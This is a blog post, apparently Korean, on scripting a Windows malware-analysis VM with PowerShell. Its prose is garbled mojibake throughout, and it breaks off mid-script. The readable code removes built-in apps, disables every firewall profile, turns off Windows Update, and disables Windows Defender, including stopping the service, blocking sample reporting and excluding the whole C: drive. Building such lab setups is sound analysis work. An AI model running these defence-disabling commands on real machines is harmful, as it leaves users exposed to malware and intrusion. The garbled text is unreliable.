ê±¸ë¦¬ëŠ” ê²½ìš°ë„ ìˆë”ë¼ê³ ìš”â€¦ ê·¸ë˜ì„œ ê±°ê¸°ì„œ ì˜ê°ì„ ì–»ì–´ì„œ ì œê°€ ìì£¼ ì‚¬ìš©í•˜ëŠ” íˆ´ë“¤ë¡œ êµ¬ì„±í•˜ì—¬ ì‘ì„±ì„ í•´ë³´ì•˜ìŠµë‹ˆë‹¤.(FlareVMì—ì„œ ê°€ì ¸ì˜¨ ì½”ë“œë„ ìˆìŠµë‹ˆë‹¤ ğŸ˜‚)</p><p>ë³¸ë˜ SSG ë™ì•„ë¦¬ ë‚´ë¶€ì—ì„œ ì•…ì„±ì½”ë“œ ê´€ë ¨ ìŠ¤í„°ë”” ë“±ì„ í•  ë•Œ ìŠ¤í¬ë¦½íŠ¸ ì£¼ë©´ì„œ ì´ê±° ì‹¤í–‰í•˜ë©´ ë  ê±°ì•¼~ í–ˆëŠ”ë° ê·¸ê±¸ ê·¸ëŒ€ë¡œ ë¸”ë¡œê·¸ì— ì˜¬ë¦¬ê¸°ì—ëŠ” ì½”ë“œê°€ ë„ˆë¬´ ì²˜ì°¸í•´ì„œâ€¦ (ë§¤ìš° ë”ëŸ½ìŠµë‹ˆë‹¤.) ì´ë²ˆ ê¸°íšŒì— ê¹”ë”í•˜ê²Œ ì‘ì„±í–ˆìŠµë‹ˆë‹¤.(ë¬¼ë¡  ì œ ê¸°ì¤€ì—ì„œë§Œ ê¹”ë”í•  ìˆ˜ë„ ìˆì–´ìš”! ì–‘í•´ ë°”ëë‹ˆë‹¤. ğŸ™‚   </p><p>íŒŒíŠ¸ëŠ” í¬ê²Œ ë‘ ê°€ì§€ë¡œ ë‚˜ë‰  ì˜ˆì •ì…ë‹ˆë‹¤. ì²« ë²ˆì§¸ íŒŒíŠ¸ì—ì„œëŠ” Windows ì„¤ì •ì— ëŒ€í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•  ì˜ˆì •ì´ê³ , ë‘ ë²ˆì§¸ íŒŒíŠ¸ì—ì„œëŠ” <a href="https://chocolatey.org/">chocolatey</a>ë¥¼ í™œìš©í•œ íˆ´ë“¤ì„ ì„¤ì¹˜í•  ê²ë‹ˆë‹¤!</p><h1 id="ë¬´ì—‡ì„-ì„¤ì •í•´ì•¼-í• ê¹Œ"><a href="#ë¬´ì—‡ì„-ì„¤ì •í•´ì•¼-í• ê¹Œ" class="headerlink" title="ë¬´ì—‡ì„ ì„¤ì •í•´ì•¼ í• ê¹Œ?"></a>ë¬´ì—‡ì„ ì„¤ì •í•´ì•¼ í• ê¹Œ?</h1><p>ê°€ì¥ ë¨¼ì € ìŠ¤í¬ë¦½íŠ¸ë¥¼ í†µí•´ì„œ ë¬´ì—‡ì„ í•´ì•¼ í• ì§€ ì •ë¦¬ë¥¼ í•˜ê³  ì‹œì‘í•©ì‹œë‹¤. ì•„ë¬´ë˜ë„ ì•…ì„±ì½”ë“œ ë¶„ì„ì„ í•´ì•¼ í•˜ë¯€ë¡œ Windows Defenderì™€ Windows UpdateëŠ” êº¼ë†“ëŠ” ê²ƒì´ ì¢‹ê² ì£ ? ì‹œì‘ í”„ë¡œê·¸ë¨ì— ë“±ë¡ë˜ì—ˆì„ ë•Œ ë³µì¡í•˜ê²Œ í•˜ì§€ ì•Šê¸° ìœ„í•´ì„œ ì‹œì‘ í”„ë¡œê·¸ë¨ë„ ì •ë¦¬í•˜ê³ â€¦ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ ë“±â€¦ ì œê°€ ìƒê°ë‚˜ëŠ” ëŒ€ë¡œ ê°„ë‹¨í•˜ê²Œ ì •ë¦¬í•´ë³´ì•˜ìŠµë‹ˆë‹¤.</p><ol><li>ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ</li><li>ë°©í™”ë²½ ë¹„í™œì„±í™”</li><li>Windows Update ë¹„í™œì„±í™”</li><li>Windows Defender ë¹„í™œì„±í™”</li><li>ë³´ì•ˆìœ ì§€ ì •ì±… ì•Œë¦¼ ë¹„í™œì„±í™”</li><li>ì‘ì—… ìŠ¤ì¼€ì¤„ëŸ¬ ì‚­ì œ</li><li>ì‹œì‘ í”„ë¡œê·¸ë¨ ì‚­ì œ</li><li>ìˆ¨ê¹€ íŒŒì¼ í‘œì‹œ</li></ol><p>Windowsì—ì„œ ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë¡œ í•œ ë²ˆì— ì„¤ì •ì„ í•œë‹¤ê³ ? ë­”ê°€ ë‚¯ì„¤ê²Œ ëŠê»´ì§€ì‹œëŠ” ë¶„ë“¤ë„ ê³„ì‹œê² ì§€ë§Œ Windowsì—ëŠ” Powershellì´ ì¡´ì¬í•©ë‹ˆë‹¤. Powershellì„ ì‚¬ìš©í•´ì„œ ìœ„ì˜ ì‘ì—…ë“¤ì„ í•˜ë‚˜í•˜ë‚˜ ì§„í–‰í•´ë´…ì‹œë‹¤!</p><h1 id="ì‚¬ìš©í•˜ì§€-ì•ŠëŠ”-ê¸°ë³¸-ì•±-ì‚­ì œ"><a href="#ì‚¬ìš©í•˜ì§€-ì•ŠëŠ”-ê¸°ë³¸-ì•±-ì‚­ì œ" class="headerlink" title="ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ"></a>ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê¸°ë³¸ ì•± ì‚­ì œ</h1><p>ì²˜ìŒ Windowsë¥¼ ì„¤ì¹˜í•˜ë©´ 3D ë·°ì–´ë‚˜, BingFinance, OfficeHub ë“±ë“± ì•…ì„±ì½”ë“œ ë¶„ì„ì—ëŠ” í™œìš©ë˜ì§€ ì•ŠëŠ” ì• í”Œë¦¬ì¼€ì´ì…˜ë“¤ì´ ë§ì´ ì„¤ì¹˜ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ì•±ì„ ì†ìˆ˜ ì§€ìš¸ ìˆ˜ë„ ìˆìœ¼ë‚˜ <code>Remove-AppxPackage</code> ëª…ë ¹ì–´ë¥¼ í†µí•´ì„œ ì‚­ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> Microsoft.XboxAppName              : Microsoft.XboxAppPublisher         : CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=USArchitecture      : X64ResourceId        :Version           : <span class="hljs-number">48.76</span>.<span class="hljs-number">8001.0</span>PackageFullName   : Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweInstallLocation   : C:\Program Files\WindowsApps\Microsoft.XboxApp_48.<span class="hljs-number">76.8001</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbweIsFramework       : FalsePackageFamilyName : Microsoft.XboxApp_8wekyb3d8bbwePublisherId       : <span class="hljs-number">8</span>wekyb3d8bbweIsResourcePackage : FalseIsBundle          : FalseIsDevelopmentMode : FalseNonRemovable      : FalseDependencies      : &#123;Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27413</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>_1.<span class="hljs-number">7.27422</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3d8bbwe, Microsoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktop_14.<span class="hljs-number">0.29231</span>.<span class="hljs-number">0</span>_x64__8wekyb3                    d8bbwe...&#125;IsPartiallyStaged : FalseSignatureKind     : StoreStatus            : Ok</code></pre><p>ì˜ˆë¥¼ ë“¤ì–´ XboxAppì˜ ê²½ìš° ë¶„ì„ì—ì„œëŠ” ì•„ì˜ˆ ì‚¬ìš©í•˜ì§€ ì•Šê² ì£ ? <code>Get-AppxPackage</code>ë¥¼ í†µí•´ íŒ¨í‚¤ì§€ì˜ ì •ë³´ë¥¼ ê°€ì ¸ì˜¬ ìˆ˜ ìˆê³ , íŒŒì´í”„ë¼ì¸ìœ¼ë¡œ <code>Remove-AppxPackage</code>ë¥¼ ì‚¬ìš©í•˜ë©´ í•´ë‹¹ íŒ¨í‚¤ì§€ê°€ ì‚­ì œë©ë‹ˆë‹¤.</p><p>ì´ë¥¼ í† ëŒ€ë¡œ ì‘ì„±í•œ ì†ŒìŠ¤ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-variable">$packages</span> = <span class="hljs-selector-tag">@</span>(    <span class="hljs-string">&quot;7EE7776C.LinkedInforWindows&quot;</span>    <span class="hljs-string">&quot;C27EB4BA.DropboxOEM&quot;</span>    <span class="hljs-string">&quot;Microsoft.3DBuilder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.Advertising.Xaml&quot;</span>    <span class="hljs-string">&quot;Microsoft.Appconnector&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFinance&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingFoodAndDrink&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingHealthAndFitness&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingNews&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingSports&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingTravel&quot;</span>    <span class="hljs-string">&quot;Microsoft.BingWeather&quot;</span>    <span class="hljs-string">&quot;Microsoft.CommsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ConnectivityStore&quot;</span>    <span class="hljs-string">&quot;Microsoft.DesktopAppInstaller&quot;</span>    <span class="hljs-string">&quot;Microsoft.Getstarted&quot;</span>    <span class="hljs-string">&quot;Microsoft.Messaging&quot;</span>    <span class="hljs-string">&quot;Microsoft.Microsoft3DViewer&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftOfficeHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.MicrosoftSolitaireCollection&quot;</span>    <span class="hljs-string">&quot;Microsoft.MixedReality.Portal&quot;</span>    <span class="hljs-string">&quot;Microsoft.Netflix&quot;</span>    <span class="hljs-string">&quot;Microsoft.NetworkSpeedTest&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Desktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.OneNote&quot;</span>    <span class="hljs-string">&quot;Microsoft.Office.Sway&quot;</span>    <span class="hljs-string">&quot;Microsoft.OfficeLens&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneConnect&quot;</span>    <span class="hljs-string">&quot;Microsoft.OneDrive&quot;</span>    <span class="hljs-string">&quot;Microsoft.People&quot;</span>    <span class="hljs-string">&quot;Microsoft.Print3D&quot;</span>    <span class="hljs-string">&quot;Microsoft.RemoteDesktop&quot;</span>    <span class="hljs-string">&quot;Microsoft.SkypeApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.Wallet&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.CloudExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.NarratorQuickStart&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.PeopleExperienceHost&quot;</span>    <span class="hljs-string">&quot;Microsoft.Windows.Photos&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsAlarms&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsCamera&quot;</span>    <span class="hljs-string">&quot;Microsoft.windowscommunicationsapps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsFeedbackHub&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsMaps&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsReadingList&quot;</span>    <span class="hljs-string">&quot;Microsoft.WindowsSoundRecorder&quot;</span>    <span class="hljs-string">&quot;Microsoft.Xbox.TCUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxApp&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameCallableUI&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGameOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxGamingOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxIdentityProvider&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxLive&quot;</span>    <span class="hljs-string">&quot;Microsoft.XboxSpeechToTextOverlay&quot;</span>    <span class="hljs-string">&quot;Microsoft.YourPhone&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneMusic&quot;</span>    <span class="hljs-string">&quot;Microsoft.ZuneVideo&quot;</span>    <span class="hljs-string">&quot;Windows.CBSPreview&quot;</span>)<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$name</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$packages</span>)&#123;    <span class="hljs-built_in">Get-AppxPackage</span> <span class="hljs-variable">$name</span> | <span class="hljs-built_in">Remove-AppxPackage</span>&#125;</code></pre><p><code>$packages</code>ì— ìˆëŠ” íŒ¨í‚¤ì§€ ì´ë¦„ì„ í•˜ë‚˜ì”© ê°€ì ¸ì™€ì„œ ì‚­ì œë¥¼ í•˜ëŠ” ë¶€ë¶„ì…ë‹ˆë‹¤. ì¶”ê°€ë˜ì–´ ìˆì§€ ì•Šì€ ì• í”Œë¦¬ì¼€ì´ì…˜ë„ ì¡´ì¬í•˜ê¸° ë•Œë¬¸ì— í˜¹ì‹œ ë³¸ì¸ì´ ì‚­ì œí•˜ê³  ì‹¶ì§€ ì•Šê±°ë‚˜ ì‚­ì œí•˜ê³  ì‹¶ì€ í”„ë¡œê·¸ë¨ì´ ìˆìœ¼ë©´ ì¶”ê°€ë¥¼ í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/06/06/idioth/setting_malware_vm/Untitled.png"></p><p>ì‚­ì œí•˜ê³  ì‹¶ì€ ì•±ì´ ìˆëŠ”ë° íŒ¨í‚¤ì§€ ì´ë¦„ì„ ëª¨ë¥´ì‹œê² ë‹¤ê³ ìš”? ê±±ì •í•˜ì§€ ë§ˆì„¸ìš”! ê¹”ë ¤ìˆëŠ” íŒ¨í‚¤ì§€ë¥¼ ì´ë¦„ìœ¼ë¡œ ì •ë ¬í•´ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤!</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Windows\system32&gt; <span class="hljs-built_in">Get-AppxPackage</span> | <span class="hljs-built_in">Select</span> NameName----windows.immersivecontrolpanelMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Windows.PrintDialogMicrosoft.WalletMicrosoft.VCLibs.<span class="hljs-number">140.00</span>Microsoft.VCLibs.<span class="hljs-number">140.00</span>RealtekSemiconductorCorp.RealtekAudioControlMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopMicrosoft.VCLibs.<span class="hljs-number">140.00</span>.UWPDesktopAdvancedMicroDevicesInc<span class="hljs-literal">-2</span>.AMDRadeonSoftwareMicrosoft.XboxSpeechToTextOverlayMicrosoft.XboxGameOverlayMicrosoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.NET.Native.Framework.<span class="hljs-number">2.2</span>Microsoft.Xbox.TCUIMicrosoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.4</span>Microsoft.UI.Xaml.<span class="hljs-number">2.0</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.UI.Xaml.<span class="hljs-number">2.1</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Framework.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.NET.Native.Runtime.<span class="hljs-number">1.7</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.3</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.UI.Xaml.<span class="hljs-number">2.5</span>Microsoft.<span class="hljs-number">549981</span>C3F5F10Microsoft.StorePurchaseAppMicrosoft.LanguageExperiencePackko<span class="hljs-literal">-KR</span>Microsoft.WinDbgmicrosoft.windowscommunicationsappsMicrosoft.WebpImageExtensionMicrosoft.XboxIdentityProviderMicrosoft.DesktopAppInstallerMicrosoft.Windows.PhotosMicrosoft.WebMediaExtensionsMicrosoft.XboxAppMicrosoft.MixedReality.PortalMicrosoft.PeopleMicrosoft.WindowsStoreMicrosoft.ZuneVideoMicrosoft.Microsoft3DViewerMicrosoft.WindowsFeedbackHubMicrosoft.MicrosoftStickyNotesMicrosoft.WindowsAlarmsMicrosoft.GetHelpMicrosoft.BingWeatherMicrosoft.WindowsCameraMicrosoft.ScreenSketchMicrosoft.WindowsMapsMicrosoft.WindowsCalculatorMicrosoft.WindowsSoundRecorderMicrosoft.ZuneMusicMicrosoft.BioEnrollmentMicrosoft.Windows.CloudExperienceHostMicrosoft.Windows.OOBENetworkConnectionFlowMicrosoft.AAD.BrokerPluginMicrosoft.Windows.OOBENetworkCaptivePortalMicrosoftWindows.UndockedDevKitMicrosoft.Windows.StartMenuExperienceHostMicrosoft.Windows.ShellExperienceHostMicrosoft.Windows.SearchMicrosoft.MicrosoftEdgeMicrosoft.Windows.ContentDeliveryManagerMicrosoftWindows.Client.CBSWindows.CBSPreviewNcsiUwpAppMicrosoft.XboxGameCallableUIMicrosoft.Windows.XGpuEjectDialogMicrosoft.Windows.SecureAssessmentBrowserMicrosoft.Windows.SecHealthUIMicrosoft.Windows.PinningConfirmationDialogMicrosoft.Windows.PeopleExperienceHostMicrosoft.Windows.ParentalControlsMicrosoft.Windows.NarratorQuickStartMicrosoft.Windows.CapturePickerMicrosoft.Windows.CallingShellAppMicrosoft.Windows.AssignedAccessLockAppMicrosoft.Windows.Apprep.ChxAppMicrosoft.Win32WebViewHostMicrosoft.MicrosoftEdgeDevToolsClientMicrosoft.LockAppMicrosoft.ECAppMicrosoft.CredDialogHostMicrosoft.AsyncTextServiceMicrosoft.AccountsControlMicrosoft.VP9VideoExtensionsMicrosoft.XboxGamingOverlayMicrosoft.HEIFImageExtensionMicrosoft.MSPaint<span class="hljs-number">91750</span>D7E.SlackMicrosoft.MicrosoftEdge.StableMicrosoft.GetstartedMicrosoft.YourPhone</code></pre><p>ì´ë¦„ì„ ì°¾ì•˜ëŠ”ë° <code>Xbox</code>ì²˜ëŸ¼ ì—¬ëŸ¬ ê°œê°€ ìˆëŠ”ë° ì ê¸°ê°€ ë„ˆë¬´ ê·€ì°®ë‹¤. ë‚˜ëŠ” í•œ ë²ˆì— í•´ì¹˜ìš°ê³  ì‹¶ë‹¤! í•˜ì‹œëŠ” ë¶„ì€ <code>Microsoft.Xbox*</code>í•˜ì‹œë©´ ë¦¬ëˆ…ìŠ¤ì™€ ê°™ì´ <code>Microsoft.Xbox1</code> ë“± ë’¤ì— ì¶”ê°€ë˜ì–´ ìˆëŠ”(?) ë­ë¼ ë§í•´ì•¼ í•˜ì§€â€¦ ìƒê°ì´ ì•ˆ ë‚˜ë„¤ìš”! ì•„ë¬´íŠ¼! ì € ë¬¸ìì—´ë¡œ ì‹œì‘í•˜ëŠ” ì¹œêµ¬ë“¤ì„ ëª¨ë‘ ì‚­ì œí•´ì¤ë‹ˆë‹¤!</p><p>ê·¸ëŸ¼ ì´ì œ ë°©í™”ë²½ì„ ë¹„í™œì„±í™”í•˜ëŸ¬ ê°€ë³¼ê¹Œìš”?</p><h1 id="ë°©í™”ë²½-ë¹„í™œì„±í™”"><a href="#ë°©í™”ë²½-ë¹„í™œì„±í™”" class="headerlink" title="ë°©í™”ë²½ ë¹„í™œì„±í™”"></a>ë°©í™”ë²½ ë¹„í™œì„±í™”</h1><p>ë°©í™”ë²½ ë¹„í™œì„±í™”ëŠ” êµ‰ì¥íˆ<del>~</del> ì½”ë“œê°€ ê°„ë‹¨í•©ë‹ˆë‹¤.</p><p>ë„ë©”ì¸, ê³µìš©, ê°œì¸ì— ëŒ€í•œ ë°©í™”ë²½ ëª¨ë‘ë¥¼ ë¹„í™œì„±í™”í•˜ë©´ ë˜ëŠ”ë° ìš”ê±°ëŠ” PowerShellì„ í†µí•´ í•œë²ˆì— ì‘ì—…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. XD</p><pre><code class="hljs powershell"><span class="hljs-built_in">Set-NetFirewallProfile</span> <span class="hljs-literal">-Profile</span> Domain, Public, Private <span class="hljs-literal">-Enabled</span> False</code></pre><h1 id="Windows-Update-ë¹„í™œì„±í™”"><a href="#Windows-Update-ë¹„í™œì„±í™”" class="headerlink" title="Windows Update ë¹„í™œì„±í™”"></a>Windows Update ë¹„í™œì„±í™”</h1><p>Windows Updateë¥¼ ë¹„í™œì„±í™”í•˜ê¸° ìœ„í•´ì„œëŠ” WindowsUpdate ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— <code>NoAutoUpdate</code>ë¥¼ ì„¤ì •í•´ì£¼ë©´ ë©ë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;WindowsUpdate&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;AU&quot;</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;NoAutoUpdate&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span></code></pre><h1 id="Windows-Defender-ë¹„í™œì„±í™”"><a href="#Windows-Defender-ë¹„í™œì„±í™”" class="headerlink" title="Windows Defender ë¹„í™œì„±í™”"></a>Windows Defender ë¹„í™œì„±í™”</h1><p>ë°©í™”ë²½ ë¹„í™œì„±í™”ëŠ” Windows Defender ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— <code>DisableAntiSpyware</code>ë§Œ ì¶”ê°€ë¥¼ í•´ë†“ì•˜ì—ˆëŠ”ë°, flare-vmì—ì„œ ì‚¬ìš©í•˜ëŠ” ì½”ë“œë¥¼ ê·¸ëŒ€ë¡œ ê°€ì ¸ì™”ìŠµë‹ˆë‹¤.</p><pre><code class="hljs powershell"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_defender</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-built_in">Write-Host</span> <span class="hljs-string">&quot;[*] Disable Windows Defender&quot;</span>    <span class="hljs-keyword">try</span>    &#123;        <span class="hljs-built_in">Get-Service</span> WinDefend | <span class="hljs-built_in">Stop-Service</span> <span class="hljs-literal">-Force</span>        <span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\WinDefend&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Start&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">4</span> <span class="hljs-literal">-Type</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    &#125;    <span class="hljs-keyword">catch</span>    &#123;        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Failed disable WinDefend Service&quot;</span>    &#125;    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Windows Defender&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableAntiSpyware&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DisableRoutinelyTakingAction&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;Spynet&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SpyNetReporting&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;SubmitSamplesConsent&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">0</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;MRT&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;HKLM:\SOFTWARE\Policies\Microsoft\MRT&quot;</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;DontReportInfectionInformation&quot;</span> <span class="hljs-literal">-Value</span> <span class="hljs-number">1</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>    <span class="hljs-keyword">if</span>(<span class="hljs-operator">-Not</span> ((<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> Win32_OperatingSystem).Version <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;6.1.7601&quot;</span>))    &#123;        <span class="hljs-built_in">Add-MpPreference</span> <span class="hljs-literal">-ExclusionPath</span> <span class="hljs-string">&quot;C:\&quot;</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableArchiveScanning</span> <span class="hljs-variable">$true</span>  <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span class="hljs-literal">-DisableBehaviorMonitoring</span> <span class="hljs-variable">$true</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-ea</span> <span class="hljs-number">0</span> | <span class="hljs-built_in">Out-Null</span>        <span class="hljs-built_in">Set-MpPreference</span> <span 